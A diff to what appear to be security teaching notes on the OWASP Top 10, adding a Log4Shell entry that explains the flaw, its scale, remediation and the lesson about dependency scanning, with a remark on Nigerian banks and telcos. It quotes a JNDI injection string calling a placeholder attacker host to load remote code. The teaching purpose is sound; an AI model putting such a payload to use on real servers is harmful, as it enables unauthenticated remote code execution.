@@ -88,8 +88,9 @@ The most common vulnerability — default credentials, open cloud storage, unnec
 **A06: Vulnerable and Outdated Components**
 Using libraries, frameworks, or OS components with known vulnerabilities.
 - 2017 Equifax breach: Apache Struts vulnerability known for months before attackers exploited it. 147 million people affected.
+- **Log4Shell (CVE-2021-44228) — CVSS 10.0 (Maximum Severity):** The most critical vulnerability of the 2020s. Apache Log4j is a Java logging library used in virtually every enterprise Java application — from iCloud to Amazon, Steam, Microsoft, and millions of enterprise systems worldwide. By inserting a specially crafted string like `${jndi:ldap://attacker.com/exploit}` into any logged field (username, user-agent, search query), an attacker triggers the server to make an outbound LDAP request to the attacker's server and execute arbitrary code. The attacker gains full Remote Code Execution (RCE) with zero authentication. Disclosed December 9, 2021; within 72 hours, over 800,000 exploitation attempts were recorded per hour globally. Remediation: upgrade Log4j to version 2.17.1+. **Teaching point:** This is A06 — the vulnerability was in a widely used open-source library. The organisations affected didn't write the vulnerable code; they included it as a dependency. Dependency management and Software Composition Analysis (SCA) scanning are therefore critical security practices.
 - Running outdated WordPress plugins
-- **Nigerian risk:** Many Nigerian websites run severely outdated CMS versions
+- **Nigerian risk:** Many Nigerian websites run severely outdated CMS versions; Log4Shell demonstrated that even internal Java services used by Nigerian banks and telcos were vulnerable
 
 **A07: Identification and Authentication Failures**
 - Allowing weak passwords ("password123")
